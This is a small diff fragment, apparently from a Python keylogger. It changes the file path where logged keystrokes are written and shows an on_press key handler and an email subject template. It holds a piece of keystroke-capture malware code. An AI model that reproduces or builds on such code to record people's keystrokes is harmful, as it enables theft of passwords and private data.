@@ -40,7 +40,7 @@ Subject: %s
 
 
 
-logging.basicConfig(filename=('/home/hmei7/Documents/key/keylog.txt'), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
+logging.basicConfig(filename=('/home/username/keylog.txt'), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
 
 def on_press(key):
